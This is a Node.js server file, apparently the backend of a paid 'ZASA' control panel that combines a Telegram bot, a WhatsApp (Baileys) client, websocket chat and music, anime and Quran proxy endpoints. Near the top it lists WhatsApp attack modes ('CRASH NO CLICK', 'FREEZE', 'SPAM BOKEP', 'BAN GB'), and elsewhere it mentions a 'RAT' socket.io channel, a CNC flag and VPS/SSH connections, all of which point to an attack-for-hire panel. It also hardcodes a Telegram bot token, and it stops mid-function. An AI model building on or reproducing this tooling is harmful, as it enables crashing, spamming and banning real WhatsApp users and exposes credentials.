const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ noServer: true });
server.on('upgrade', (req, socket, head) => {
  const pathname = new URL(req.url, 'http://localhost').pathname;
  if (pathname.startsWith('/socket.io')) return; // serahkan ke engine.io (RAT)
  wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
});
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const { Server } = require('socket.io');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000; // 30 menit
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "delay", bug_name: "DELAY INVISIBLE" },
{ bug_id: "okep", bug_name: "SPAM BOKEP" },
{ bug_id: "crash", bug_name: "CRASH NO CLICK" },
{ bug_id: "freeze", bug_name: "FREEZE" },
{ bug_id: "bangb", bug_name: "BAN GB" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8975396584:AAGy97FMtqdnsQcH2DEUstUY9f0T_sbb4_Q"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

// ═══════════════════════════════════════════════════════════════
// [PART 1/3] RICH MESSAGE HELPER — Bot API 10.1/10.2
// Styled buttons + fallback-safe
// ═══════════════════════════════════════════════════════════════

const TG_API = `https://api.telegram.org/bot${TOKEN}`;

async function sendRichMessage(chatId, richHtml, replyMarkup = null) {
  try {
    const body = {
      chat_id: chatId,
      rich_message: { html: richHtml },
    };
    if (replyMarkup) body.reply_markup = replyMarkup;

    const r = await axios.post(`${TG_API}/sendRichMessage`, body, {
      timeout: 15000,
      headers: { 'Content-Type': 'application/json' },
    });

    if (!r.data || !r.data.ok) {
      throw new Error(r.data?.description || 'Rich message failed');
    }
    return r.data.result;
  } catch (err) {
    console.error('[RICH] Gagal kirim:', err.response?.data?.description || err.message);
    return null;
  }
}

async function editRichMessage(chatId, messageId, richHtml, replyMarkup = null) {
  try {
    const body = {
      chat_id: chatId,
      message_id: messageId,
      rich_message: { html: richHtml },
    };
    if (replyMarkup) body.reply_markup = replyMarkup;

    const r = await axios.post(`${TG_API}/editMessageText`, body, {
      timeout: 15000,
      headers: { 'Content-Type': 'application/json' },
    });

    if (!r.data || !r.data.ok) {
      throw new Error(r.data?.description || 'Edit rich failed');
    }
    return r.data.result;
  } catch (err) {
    console.error('[RICH-EDIT] Gagal:', err.response?.data?.description || err.message);
    return null;
  }
}

async function sendRichMenu({ chatId, messageId, html, keyboard, fallbackText, fallbackKeyboard }) {
  if (messageId) {
    const edited = await editRichMessage(chatId, messageId, html, keyboard);
    if (edited) return edited;
  }

  const sent = await sendRichMessage(chatId, html, keyboard);
  if (sent) return sent;

  console.warn('[RICH] Fallback ke sendMessage biasa');
  return originalBotSendMessage(chatId, fallbackText, {
    parse_mode: 'HTML',
    reply_markup: fallbackKeyboard || keyboard,
  });
}

// Rich-message wrapper global: semua output menu Telegram dicoba dikirim sebagai tabel rich.
// Jika endpoint Rich Message tidak tersedia, pesan tetap dikirim lewat Telegram Bot API biasa.
const originalBotSendMessage = bot.sendMessage.bind(bot);
function escapeRichText(value) {
  return String(value ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function toTableRichHTML(value) {
  const raw = String(value ?? '');
  // Pertahankan HTML yang memang sudah disiapkan oleh menu rich yang ada.
  if (/<table[\s>]/i.test(raw)) return raw;
  const rows = raw.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
  const content = rows.length ? rows.map((line, index) =>
    `<tr><td>${String(index + 1).padStart(2, '0')}</td><td>${escapeRichText(line)}</td></tr>`
  ).join('') : '<tr><td>INFO</td><td>Pesan kosong</td></tr>';
  return `<h2>╭━━〔 ZASA • RICH PANEL 〕━━╮</h2><table><tr><th>NO</th><th>INFORMASI / MENU</th></tr>${content}</table><p>━━━━━━━━━━━━━━━━━━━━</p>`;
}
bot.sendMessage = async function(chatId, text, options = {}) {
  // Hindari mengubah media/format spesifik dan percobaan fallback dari helper rich.
  if (options?.__skipRich) {
    const cleanOptions = { ...options }; delete cleanOptions.__skipRich;
    return originalBotSendMessage(chatId, text, cleanOptions);
  }
  const html = toTableRichHTML(text);
  const markup = options?.reply_markup || null;
  const rich = await sendRichMessage(chatId, html, markup);
  if (rich) return rich;
  return originalBotSendMessage(chatId, text, options);
};

function buildStartRichHTML(firstName, username, isOwner, userRole = 'member') {
  const roleLabel = isOwner ? '👑 OWNER' : `🎖️ ${userRole.toUpperCase()}`;
  const adminRoles = ['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin'];
  let menuRows = `
    <tr><td>👤</td><td><b>Buat Akun Member</b></td><td>/cakun</td></tr>
    <tr><td>⏳</td><td><b>Set Expired</b></td><td>/expired</td></tr>`;
  if (adminRoles.includes(userRole)) {
    menuRows += `
    <tr><td>📋</td><td><b>List User</b></td><td>/listuser</td></tr>
    <tr><td>🧩</td><td><b>Buat Custom User</b></td><td>/add</td></tr>
    <tr><td>🗑️</td><td><b>Hapus User</b></td><td>/remove</td></tr>`;
  }
  let ownerRows = '';
  if (isOwner || ['owner', 'high owner', 'developer'].includes(userRole)) {
    ownerRows = `
      <h3>🛠️ TABEL MANAJEMEN AKSES</h3>
      <table><tr><th>FITUR</th><th>PERINTAH</th></tr>
      <tr><td>Tambah akses</td><td><code>/add &lt;role&gt; &lt;userId&gt;</code></td></tr>
      <tr><td>Hapus akses</td><td><code>/remove &lt;userId&gt;</code></td></tr>
      <tr><td>Daftar user</td><td><code>/listuser</code></td></tr>
      <tr><td>Broadcast</td><td><code>/bc</code></td></tr>
      <tr><td>Request upgrade</td><td><code>/upgrade</code></td></tr>
      <tr><td>Pembelian pending</td><td><code>/pendingbuy</code></td></tr>
      <tr><td>Status sender WA</td><td><code>/senderinfo</code></td></tr></table>`;
  }
  return `
  <h1>╭━━━〔 ZASA CONTROL PANEL 〕━━━╮</h1>
  <p>⚡ <b>Selamat datang, ${firstName}!</b></p>
  <table>
    <tr><th colspan="2">INFORMASI AKUN</th></tr>
    <tr><td>🆔 Username</td><td><code>@${username || 'unknown'}</code></td></tr>
    <tr><td>🎖️ Role</td><td><b>${roleLabel}</b></td></tr>
    <tr><td>🟢 Status</td><td>Panel aktif</td></tr>
  </table>
  <h3>📚 TABEL MENU UTAMA</h3>
  <table><tr><th>ICON</th><th>MENU</th><th>COMMAND</th></tr>${menuRows}</table>
  ${ownerRows}
  <p>━━━━━━━━━━━━━━━━━━━━</p>
  <p>💡 <i>Pilih tombol menu di bawah atau ketik command yang tersedia.</i></p>
  <p>👨‍💻 Bantuan: @zasaco / @zasajir</p>`.trim();
}

function buildStartKeyboard(userRole = 'member', isOwner = false) {
  const keyboard = [
    [{ text: "Buat Akun Member", callback_data: "create_member", style: "success" }],
    [{ text: "Set Expired",      callback_data: "set_expire",    style: "primary" }],
  ];

  // ══════ Tombol admin (list, custom, hapus) ══════
  if (['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin'].includes(userRole)) {
    keyboard.push(
      [{ text: "List User",        callback_data: "list_user",     style: "primary" }],
      [{ text: "Buat Custom User", callback_data: "create_custom", style: "primary" }],
      [{ text: "Hapus User",       callback_data: "delete_user",   style: "danger"  }]
    );
  }

  return { inline_keyboard: keyboard };
}

// ═══════════════════════════════════════════════════════════════
// END PART 1/3
// ═══════════════════════════════════════════════════════════════

// Fungsi Helper untuk Logging Asinkron (Mencegah Server Freeze/Lag)
async function appendLogAsync(filePath, data) {
  try {
    // Cek ukuran file dulu, jika terlalu besar (>5MB) hapus isi lama
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) { // 5MB Limit
        fs.writeFileSync(filePath, ''); // Reset file jika terlalu besar
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    // ===== CLEAR SESSION =====
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    // ===== AUTO RESTART =====
    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}
// ===== Setup Log System =====
const LOGS_DIR = path.join(__dirname, 'user_logs'); // Folder khusus log user

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// Buat folder jika belum ada
if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

/**
 * Fungsi untuk menyimpan aktivitas user ke file JSON mereka sendiri
 * @param {string} username - Username user
 * @param {string} type - 'login', 'bug', 'create'
 * @param {string} title - Judul aktivitas
 * @param {string} description - Detail aktivitas
 */
function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    // Baca log lama jika ada
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    // Tambah log baru
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now() // Timestamp dalam milidetik
    });

    // Simpan kembali (Overwrite)
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const PORT = 3730;

// Ganti listen jadi ini: semua layanan (API + WebSocket dashboard + RAT socket.io) satu port
server.listen(PORT, () => {
  console.log(`🟣 Server running on http://angelstore.pterocloud.my.id:${PORT}`);
  setupVipFolder();
  startUserSessions();

  // dY+ Jalankan Auto Refresh Timer
  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
});

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ══════════════════════════════════════════════════════════════
// ══════ DEEZER PROXY (BUAT MUSIC PAGE) ══════
// ══════════════════════════════════════════════════════════════

// ── In-memory cache (biar ga spam Deezer) ──
const deezerCache = new Map();
const DEEZER_CACHE_TTL = 5 * 60 * 1000; // 5 menit

function getDeezerCache(key) {
  const entry = deezerCache.get(key);
  if (!entry) return null;
  if (Date.now() - entry.time > DEEZER_CACHE_TTL) {
    deezerCache.delete(key);
    return null;
  }
  return entry.data;
}

function setDeezerCache(key, data) {
  deezerCache.set(key, { data, time: Date.now() });
  if (deezerCache.size > 100) {
    const firstKey = deezerCache.keys().next().value;
    deezerCache.delete(firstKey);
  }
}

// ── Rate limit khusus Deezer (max 5 req/detik per IP) ──
const deezerRateLimit = {};
function deezerLimiter(req, res, next) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  const now = Date.now();
  if (!deezerRateLimit[ip]) deezerRateLimit[ip] = [];
  deezerRateLimit[ip] = deezerRateLimit[ip].filter(ts => now - ts < 1000);
  deezerRateLimit[ip].push(now);

  if (deezerRateLimit[ip].length > 5) {
    console.warn(`[🚫 DEEZER LIMIT] IP ${ip} spam`);
    return res.status(429).json({
      error: 'Too many requests',
      message: 'Terlalu banyak request. Coba lagi sebentar lagi.'
    });
  }
  next();
}

// ── Endpoint: Search lagu ──
app.get("/deezer/search", deezerLimiter, async (req, res) => {
  try {
    const q = req.query.q || '';
    const limit = req.query.limit || 40;
    if (!q) return res.status(400).json({ error: 'Query required' });

    const cacheKey = `search:${q}:${limit}`;
    const cached = getDeezerCache(cacheKey);
    if (cached) {
      console.log(`[DEEZER CACHE HIT] ${cacheKey}`);
      return res.json(cached);
    }

    const r = await axios.get(
      `https://api.deezer.com/search?q=${encodeURIComponent(q)}&limit=${limit}`,
      {
        timeout: 15000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json',
        }
      }
    );

    setDeezerCache(cacheKey, r.data);
    console.log(`[DEEZER] Search "${q}" OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[DEEZER SEARCH] Error:', e.message);
    res.status(500).json({ error: 'Failed to fetch from Deezer', message: e.message });
  }
});

// ── Endpoint: Top chart ──
app.get("/deezer/chart", deezerLimiter, async (req, res) => {
  try {
    const limit = req.query.limit || 30;
    const cacheKey = `chart:${limit}`;
    const cached = getDeezerCache(cacheKey);
    if (cached) {
      console.log(`[DEEZER CACHE HIT] ${cacheKey}`);
      return res.json(cached);
    }

    const r = await axios.get(
      `https://api.deezer.com/chart/0/tracks?limit=${limit}`,
      {
        timeout: 15000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json',
        }
      }
    );

    setDeezerCache(cacheKey, r.data);
    console.log(`[DEEZER] Chart OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[DEEZER CHART] Error:', e.message);
    res.status(500).json({ error: 'Failed to fetch from Deezer', message: e.message });
  }
});

console.log('[DEEZER] Proxy endpoint terpasang: /deezer/search & /deezer/chart');

// ══════════════════════════════════════════════════════════════
// ══════ JIKAN ANIME PROXY (BUAT anime_page.dart) ══════
// ══════════════════════════════════════════════════════════════
const JIKAN_BASE = 'https://api.jikan.moe/v4';
const jikanCache = new Map();
const JIKAN_CACHE_TTL = 10 * 60 * 1000; // 10 menit

function getJikanCache(key) {
  const entry = jikanCache.get(key);
  if (!entry) return null;
  if (Date.now() - entry.time > JIKAN_CACHE_TTL) {
    jikanCache.delete(key);
    return null;
  }
  return entry.data;
}

function setJikanCache(key, data) {
  jikanCache.set(key, { data, time: Date.now() });
  if (jikanCache.size > 50) {
    const firstKey = jikanCache.keys().next().value;
    jikanCache.delete(firstKey);
  }
}

// Endpoint: Top Anime
app.get('/jikan/top', async (req, res) => {
  try {
    const limit = req.query.limit || 24;
    const type = req.query.type || '';
    const cacheKey = `top:${limit}:${type}`;
    const cached = getJikanCache(cacheKey);
    if (cached) return res.json(cached);

    let url = `${JIKAN_BASE}/top/anime?limit=${limit}`;
    if (type) url += `&type=${type}`;

    const r = await axios.get(url, {
      timeout: 15000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      }
    });

    setJikanCache(cacheKey, r.data);
    console.log(`[JIKAN] Top anime OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[JIKAN TOP] Error:', e.message);
    res.status(500).json({ error: 'Failed to fetch top anime', message: e.message });
  }
});

// Endpoint: Airing
app.get('/jikan/airing', async (req, res) => {
  try {
    const limit = req.query.limit || 24;
    const cacheKey = `airing:${limit}`;
    const cached = getJikanCache(cacheKey);
    if (cached) return res.json(cached);

    const r = await axios.get(`${JIKAN_BASE}/seasons/now?limit=${limit}`, {
      timeout: 15000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      }
    });

    setJikanCache(cacheKey, r.data);
    console.log(`[JIKAN] Airing anime OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[JIKAN AIRING] Error:', e.message);
    res.status(500).json({ error: 'Failed to fetch airing anime', message: e.message });
  }
});

// Endpoint: Upcoming
app.get('/jikan/upcoming', async (req, res) => {
  try {
    const limit = req.query.limit || 24;
    const cacheKey = `upcoming:${limit}`;
    const cached = getJikanCache(cacheKey);
    if (cached) return res.json(cached);

    const r = await axios.get(`${JIKAN_BASE}/seasons/upcoming?limit=${limit}`, {
      timeout: 15000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      }
    });

    setJikanCache(cacheKey, r.data);
    console.log(`[JIKAN] Upcoming anime OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[JIKAN UPCOMING] Error:', e.message);
    res.status(500).json({ error: 'Failed to fetch upcoming anime', message: e.message });
  }
});

// Endpoint: Search
app.get('/jikan/search', async (req, res) => {
  try {
    const q = req.query.q || '';
    const limit = req.query.limit || 24;
    if (!q) return res.status(400).json({ error: 'Query required' });

    const cacheKey = `search:${q}:${limit}`;
    const cached = getJikanCache(cacheKey);
    if (cached) return res.json(cached);

    const r = await axios.get(`${JIKAN_BASE}/anime?q=${encodeURIComponent(q)}&limit=${limit}`, {
      timeout: 15000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
      }
    });

    setJikanCache(cacheKey, r.data);
    console.log(`[JIKAN] Search "${q}" OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[JIKAN SEARCH] Error:', e.message);
    res.status(500).json({ error: 'Failed to search anime', message: e.message });
  }
});

console.log('[JIKAN] Proxy endpoint terpasang: /jikan/top, /jikan/airing, /jikan/upcoming, /jikan/search');


// ══════════════════════════════════════════════════════════════
// ══════ QUR'AN API (BUAT FITUR BACA AL-QUR'AN) ══════
// ══════════════════════════════════════════════════════════════
const QURAN_BASE = 'https://equran.id/api/v2';
const quranCache = new Map();
const QURAN_CACHE_TTL = 10 * 60 * 1000;

function getQuranCache(key) {
  const entry = quranCache.get(key);
  if (!entry) return null;
  if (Date.now() - entry.time > QURAN_CACHE_TTL) {
    quranCache.delete(key);
    return null;
  }
  return entry.data;
}

function setQuranCache(key, data) {
  quranCache.set(key, { data, time: Date.now() });
  if (quranCache.size > 200) {
    const firstKey = quranCache.keys().next().value;
    quranCache.delete(firstKey);
  }
}

const quranRateLimit = {};
function quranLimiter(req, res, next) {
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  const now = Date.now();
  if (!quranRateLimit[ip]) quranRateLimit[ip] = [];
  quranRateLimit[ip] = quranRateLimit[ip].filter((ts) => now - ts < 60000);
  quranRateLimit[ip].push(now);

  if (quranRateLimit[ip].length > 30) {
    console.warn(`[🚫 QURAN LIMIT] IP ${ip} spam`);
    return res.status(429).json({
      error: 'Too many requests',
      message: 'Terlalu banyak request. Coba lagi sebentar lagi.',
    });
  }
  next();
}

// ── Endpoint: Daftar 114 surah ──
app.get('/quran/surah', quranLimiter, async (req, res) => {
  try {
    const cacheKey = 'surah-list';
    const cached = getQuranCache(cacheKey);
    if (cached) {
      console.log(`[QURAN CACHE HIT] ${cacheKey}`);
      return res.json(cached);
    }

    const r = await axios.get(`${QURAN_BASE}/surat`, {
      timeout: 15000,
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        Accept: 'application/json',
      },
    });

    setQuranCache(cacheKey, r.data);
    console.log(`[QURAN] Surah list OK`);
    res.json(r.data);
  } catch (e) {
    console.error('[QURAN SURAH] Error:', e.message);
    res
      .status(500)
      .json({ error: 'Failed to fetch surah list', message: e.message });
  }
});

// ── Endpoint: Detail surah + ayat ──
app.get('/quran/surah/:nomor', quranLimiter, async (req, res) => {
  try {
    const nomor = parseInt(req.params.nomor);
    if (isNaN(nomor) || nomor < 1 || nomor > 114) {
      return res
        .status(400)
        .json({ error: 'Nomor surah harus 1-114' });
    }

    const cacheKey = `surah:${nomor}`;
    const cached = getQuranCache(cacheKey);
    if (cached) {
      console.log(`[QURAN CACHE HIT] ${cacheKey}`);
      return res.json(cached);
    }

    const r = await axios.get(`${QURAN_BASE}/surat/${nomor}`, {
      timeout: 20000,
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        Accept: 'application/json',
      },
    });

    setQuranCache(cacheKey, r.data);
    console.log(`[QURAN] Surah ${nomor} OK`);
    res.json(r.data);
  } catch (e) {
    console.error(`[QURAN DETAIL] Error:`, e.message);
    res
      .status(500)
      .json({ error: 'Failed to fetch surah detail', message: e.message });
  }
});

// ── Endpoint: Cari surah ──
app.get('/quran/search', quranLimiter, async (req, res) => {
  try {
    const q = (req.query.q || '').toLowerCase().trim();
    if (!q) {
      return res.status(400).json({ error: 'Query "q" required' });
    }

    const cacheKey = 'surah-list';
    let listData = getQuranCache(cacheKey);

    if (!listData) {
      const r = await axios.get(`${QURAN_BASE}/surat`, {
        timeout: 15000,
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          Accept: 'application/json',
        },
      });
      listData = r.data;
      setQuranCache(cacheKey, listData);
    }

    const surahs = listData?.data || [];
    const filtered = surahs.filter((s) => {
      const latin = (s.namaLatin || '').toLowerCase();
      const arti = (s.arti || '').toLowerCase();
      const nomor = String(s.nomor || '');
      return latin.includes(q) || arti.includes(q) || nomor === q;
    });

    console.log(`[QURAN] Search "${q}" — ${filtered.length} hasil`);
    res.json({
      code: 200,
      message: 'Success',
      total: filtered.length,
      data: filtered,
    });
  } catch (e) {
    console.error('[QURAN SEARCH] Error:', e.message);
    res
      .status(500)
      .json({ error: 'Failed to search', message: e.message });
  }
});

console.log(
  '[QURAN] Proxy endpoint terpasang: /quran/surah, /quran/surah/:nomor, /quran/search'
);

// ══════════════════════════════════════════════════════════════
// ══════ TIKTOK DOWNLOADER — Proxy ke API pihak ke-3 ══════
// ══════════════════════════════════════════════════════════════

app.get('/tiktok/download', async (req, res) => {
  try {
    const url = req.query.url;
    const hd = req.query.hd === '1';

    if (!url) {
      return res.status(400).json({ valid: false, message: 'URL wajib diisi' });
    }

    // Validasi URL TikTok
    if (!url.includes('tiktok.com') && !url.includes('douyin')) {
      return res.status(400).json({ valid: false, message: 'URL bukan TikTok' });
    }

    console.log(`[TIKTOK] Request: ${url} | HD: ${hd}`);

    // ── PAKAI API PUBLIK (bisa ganti kalo mati) ──
    // Opsi 1: TikWM API (paling stabil)
